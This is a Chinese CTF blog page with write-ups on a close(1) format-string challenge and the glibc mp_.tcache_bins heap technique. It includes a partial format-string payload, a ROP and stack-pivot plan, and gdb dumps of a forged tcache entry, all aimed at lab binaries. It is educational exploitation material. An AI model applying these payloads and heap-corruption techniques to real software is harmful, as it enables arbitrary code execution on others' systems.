        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/08/close1%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-title-link" itemprop="url">close1的格式化字符串</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-08 14:51:58" itemprop="dateCreated datePublished" datetime="2022-07-08T14:51:58+08:00">2022-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-31 11:47:48" itemprop="dateModified" datetime="2022-07-31T11:47:48+08:00">2022-07-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>第一次遇到这种题是在今年的鹏城杯，无奈于没接触过所以没做出来，赛后想复现但是暂时还没有很多wp，所以先复现一下类似的题目。</p>
<p>经过测试发现在关闭标准输出之后用<code>printf</code>最多只能写进<code>0x2000</code>个字节，而正常情况下（没有<code>close(1)</code>）<code>printf</code>可以写任意两个字节，但是这个点好像没有看人提到过…</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222623#h2-0">不错的文章</a></p>
<h3 id="De1ta-ctf-unprintable"><a href="#De1ta-ctf-unprintable" class="headerlink" title="De1ta ctf-unprintable"></a>De1ta ctf-unprintable</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Ch4r1l3&#x27;s printf test&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your gift: %p\n&quot;</span>, v3);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>在<code>exit</code>函数的调用链中会调用<code>_dl_fini</code>，其源码的一部分如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">     <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">		    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">		    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();		<span class="comment">//调用fini_array段的函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的<code>l-&gt;l_addr</code>默认为0，而<code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>指向<code>fini_array</code>段，</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>随便输入，将断点断到<code>call printf</code>处</p>
<img src="/2022/07/08/close1%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/De-1.jpg" class>

<p>因为格式化字符串在程序段中，而且栈上没有数据指向<code>printf</code>函数的返回地址，所以需要用别的办法</p>
<p>由知识点中贴的<code>_dl_fini</code>源码可知函数指针<code>array</code>会由<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>所得，而且接下来就去调用了<code>array</code>指针，而<code>l-&gt;l_addr</code>默认为0，其所对应的就是上图中的蓝圈所圈的地址中的值，而<code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>指向的是<code>fini_array</code>段，所以如果能修改<code>l-&gt;l_addr</code>的话就能使得<code>array</code>指针落在我们想要的地方，这样就能先在数据段布置函数指针，然后使其在上述过程中被调用。</p>
<p>（但是我还不知道什么情况下<code>l-&gt;l_addr</code>指针会出现在栈上，自己写demo时发现即便显式调用<code>exit</code>，这个指针也没有出现在栈上，而是<code>call exit</code>途中被push进栈的）</p>
<p>直接跳回到main函数的read处继续下一步，这一部分的payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_read = <span class="number">0x4007A3</span></span><br><span class="line">bss = <span class="number">0x601060</span></span><br><span class="line">fini = <span class="number">0x600DD8</span></span><br><span class="line">offset = bss - fini + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(main_read)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<img src="/2022/07/08/close1%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/De-2.jpg" class>

<p>跳回去之后就有指向<code>printf</code>函数返回地址的指针了（这个指针是在<code>call exit</code>时留下的，而因为<code>call exit</code>的途中就跳回来了，所以残留了这个指针）</p>
<p>既然有能劫持<code>printf</code>函数返回地址的指针，那么就能无限劫持<code>printf</code>到main函数的read处，从而再次触发格式化字符串</p>
<p>接下来确定攻击思路：</p>
<p>① 在数据段中布置ROP，这段ROP的作用是用magic gadget + csu将stderr改成one_gadget（因为FULL RELRO，所以选择修改数据段中的stderr），最后用csu call one_gadget即可</p>
<p>② 为了完成①，我们就需要完成栈迁移，栈迁移可以拆成两个部分，一个是将<code>printf</code>函数的返回地址修改成<code>pop rsp</code>，因为程序段中有<code>pop rsp</code>，所以这一步很简单，二是要在<code>printf</code>函数返回地址+8处布置要pop的地址，也就是bss段</p>
<p> ③ 为了完成②，我们还需要一个指向<code>printf</code>函数返回地址+8的指针，这一部分就回到正常的.bss段格式化字符串了，这一部分也不难</p>
<p>总得来说并不是很难，所以exp不贴了</p>
<h5 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h5><p>在打<code>stderr</code>打通之后发现在shell里没办法正常回显，虽然<code>stdout</code>是正常的，但是仍然如下提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">ls: write error: Bad file descriptor</span><br></pre></td></tr></table></figure>

<p>然后尝试把标准错误重定向到标准输出，发现还是不行</p>
<p>于是尝试去打<code>stdout</code>，然后把标准输出重定向到标准错误，发现就可以正常回显了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">ls: write error: Bad file descriptor</span><br><span class="line">$ exec 1&gt;&amp;2</span><br><span class="line">$ ls</span><br><span class="line">1  1.py  core  libc-2.23.so  peda-session-unprintable.txt  unprintable</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/07/05/mp-struct/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/05/mp-struct/" class="post-title-link" itemprop="url">mp_struct</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-05 19:25:50" itemprop="dateCreated datePublished" datetime="2022-07-05T19:25:50+08:00">2022-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-06 21:01:56" itemprop="dateModified" datetime="2022-07-06T21:01:56+08:00">2022-07-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>严格来说这一部分应该归到tcache的知识点中</p>
<p>似乎在网上不怎么找得到关于这个知识点的文章，所以只能自己看源码来分析一下</p>
<h3 id="mp"><a href="#mp" class="headerlink" title="mp_"></a>mp_</h3><p>在malloc.c源码中，<code>mp_</code>是一个由<code>malloc_par</code>结构体声明的结构体变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而结构体<code>malloc_par</code>的声明如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span> n_mmaps;</span><br><span class="line">  <span class="keyword">int</span> n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="keyword">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="keyword">char</span> *sbrk_base;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_bins;</span><br><span class="line">  <span class="keyword">size_t</span> tcache_max_bytes;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks in each bucket.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_count;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks to remove from the unsorted list, which</span></span><br><span class="line"><span class="comment">     aren&#x27;t used to prefill the cache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_limit;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>tcache_bins</code>这一项记录的是tcache bin的总数量，正常情况下有64个tcache bin。其在<code>mp_</code>中的偏移为0x50</p>
<h3 id="计算tc-idx"><a href="#计算tc-idx" class="headerlink" title="计算tc_idx"></a>计算tc_idx</h3><p>大概梳理一下malloc的流程，在有tcache的版本下，程序首先会根据传入的参数大小（bytes）计算出实际需要的chunk大小（tbytes），然后根据这个大小计算出对应的tcache bin下标（tc_idx）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br></pre></td></tr></table></figure>

<p>因为在攻击中我们需要知道这个tc_idx和tbytes的对应关系，所以要了解一下具体是怎么算出来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="line"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br></pre></td></tr></table></figure>

<p>其中<code>MINSIZE</code>一般在32位下是0x10字节，64位下是0x20字节，<code>MALLOC_ALIGNMENT</code>在32位下是8个字节，64位下是16个字节。</p>
<p>那么这样代入我们就能算出特定大小的chunk所对应的<code>tc_idx</code>了</p>
<h3 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h3><p>然后程序根据以下三点来判断是否从tcache中取块：① 下标在tcache bin范围里。② tcache指针有值。③ 下标对应的bin中有chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> TAG_NEW_USABLE (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>tcache_get</code>函数是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数很简单，根据下标从<code>tcache-&gt;entries</code>中取chunk地址给<code>e</code>，更新<code>tcache-&gt;counts[tc_idx]</code>，然后<code>tcache-&gt;counts[tc_idx]</code>减一。</p>
<p>这里的tcache是个结构体指针，其指向对应线程所维护的那个<code>tcache_perthread_struct</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>其中<code>tcache_perthread_struct</code>是整个tcache的管理结构，其中记录了每条tcache bin链表中chunk的数量以及每条tcache bin链表头部的地址，这个结构体的总大小为<code>1 * 64 + 8 * 64 = 0x240</code>个字节，而每个 thread 都会用一个chunk来存放这个管理结构，所以其总大小为<code>0x250</code></p>
<p>对于主线程来说，其位于<code>heap</code>段开头。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br></pre></td></tr></table></figure>

<p><strong>值得注意的是，从glibc-2.30开始，<code>tcache_perthread_struct</code>中的<code>counts</code>变成了<code>uint16_t</code>类型的，也就是说一个<code>counts</code>占两个字节，<code>tcache_perthread_struct</code>chunk的总大小变成0x290</strong></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在了解完上面的点之后其实可以发现，由于<code>tc_idx</code>是直接跟<code>tbytes</code>挂钩的，所以当<code>tbytes</code>大于正常的tcache bin chunk时，<code>tc_idx</code>就不会是正常的tcache bin下标，但是由于其存在对下标合法性的检查（如下），所以正常情况下当<code>tc_idx</code>不在tcache bin范围中时，程序就不会从tcache中取chunk。其实也可以理解为“程序是通过计算出来的下标是否属于tcache bin以及<code>tcache-&gt;counts[tc_idx]</code>是否大于0”来决定“是否从tcache bin中取chunk”。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)</span><br></pre></td></tr></table></figure>

<p>所以如果我们修改<code>mp_.tcache_bins</code>为一个大值，那么程序就会认为一个大范围内的地址都属于tcache bin，而且由于主线程的<code>tcache_perthread_struct</code>结构就在heap段开头，所以<code>tcache_perthread_struct</code>之后的地址中的值都是可控的，这也就意味着我们可以直接往伪造的tcache bin上放任意地址，然后申请对应的大小，从这个伪造的tcache bin中将这个我们布置的地址给拿出来。只需要同时保证对应的<code>tcache-&gt;counts[tc_idx] &gt; 0</code>即可。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>首先将<code>mp_</code>中<code>tcache_bins</code>的值改成一个大值（可以用unsorted bin attack、largebin_attack之类的），如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p mp_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  trim_threshold = 0x20000, </span><br><span class="line">  top_pad = 0x20000, </span><br><span class="line">  mmap_threshold = 0x20000, </span><br><span class="line">  arena_test = 0x8, </span><br><span class="line">  arena_max = 0x0, </span><br><span class="line">  n_mmaps = 0x0, </span><br><span class="line">  n_mmaps_max = 0x10000, </span><br><span class="line">  max_n_mmaps = 0x0, </span><br><span class="line">  no_dyn_threshold = 0x0, </span><br><span class="line">  mmapped_mem = 0x0, </span><br><span class="line">  max_mmapped_mem = 0x0, </span><br><span class="line">  sbrk_base = 0x555555759000 &quot;&quot;, </span><br><span class="line">  tcache_bins = 0x55555575afb0, </span><br><span class="line">  tcache_max_bytes = 0x408, </span><br><span class="line">  tcache_count = 0x7, </span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们在<code>tcache_perthread_struct</code>chunk的相邻chunk中布置一个<code>__free_hook</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x555555759290</span><br><span class="line">0x555555759290:	0x0000000000000000	0x0000000000000421</span><br><span class="line">0x5555557592a0:	0x00007ffff7fb9e20	0x0000000000000000</span><br><span class="line">0x5555557592b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>那么此时假如我们<code>malloc(0x430)</code>，malloc的流程怎么走呢？</p>
<p>首先计算出<code>tbytes = 0x440</code>，然后计算出<code>tc_idx = 0x42</code>，由于<code>0x42 &lt; 0x55555575afb0</code>，也就是满足<code>tc_idx &lt; mp_.tcache_bins</code>，然后计算<code>tcache-&gt;counts[tc_idx]</code>，也就是<code>heap_base + 0x10 + 2 * 0x42</code>，我们需要在这个地址中写一个值，让其至少大于0，满足counts的条件</p>
<p>当以上两点都满足之后，tcache就会从对应的tcache bin中取chunk，<code>tcache-&gt;entries[tc_idx] = heap_base + 0x10 + 2 * 0x40 + 8 * 0x42 = heap_base + 0x2a0</code>，也就是说在<code>0x5555557592a0</code>处布置的<code>__free_hook</code>就被取出来了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/" class="post-title-link" itemprop="url">2022鹏城杯初赛pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-05 17:09:22" itemprop="dateCreated datePublished" datetime="2022-07-05T17:09:22+08:00">2022-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-06 11:03:14" itemprop="dateModified" datetime="2022-09-06T11:03:14+08:00">2022-09-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>坐了一天大牢一题没做出来，感觉是真难，赛后看别的师傅的WP时发现有好多没想到和没学过的点，感觉收获挺多，好好复现</p>
<p>这次比赛的堆题大多都用到了largebin_attack，感觉在新版本的glibc中会是比较常见的考点，还有IO_FILE那部分依然很重要，要多巩固这部分的知识。</p>
<h2 id="A-fruit"><a href="#A-fruit" class="headerlink" title="A_fruit"></a>A_fruit</h2><p>考点：largebin_attack、劫持mp_、orw。show函数部分有加密，目前看到两种思路：z3和爆破。</p>
<p>版本：glibc-2.33</p>
